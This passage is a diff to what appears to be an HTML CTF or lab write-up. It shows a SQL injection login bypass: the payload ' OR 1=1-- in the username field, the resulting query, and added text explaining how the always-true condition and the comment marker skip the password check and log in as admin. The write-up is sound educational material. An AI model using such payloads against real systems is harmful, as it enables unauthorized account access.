@@ -141,11 +141,12 @@
     <p>I tried to do a basic SQL Injection to see how the server behaves.</p>
 
     <p><strong>Payload:</strong></p>
-    <pre>Username: ' OR 1=1-- -
-Password: anything</pre>
+    <pre>Username: <code>' OR 1=1--</code>
+Password:<code>anything</code></pre>
 
     <p><strong>Resulting Query:</strong></p>
     <pre><code>SELECT * FROM users WHERE username = '' OR 1=1-- -' AND password = '...';</code></pre>
+    <pre><code>1=1</code> IS ALWAYS TRUE, so the payload returns true and logs us in into the first user in the database, Which is most of the time the admin. And <code>--</code>Are to comment everything afterwards, So the password does not matter</pre>
     <p>And like that we are in.</p>
 
     <img src="https://github.com/user-attachments/assets/bdb0e30c-d989-445f-b574-d535f029f4c1" alt="Logged in as admin">
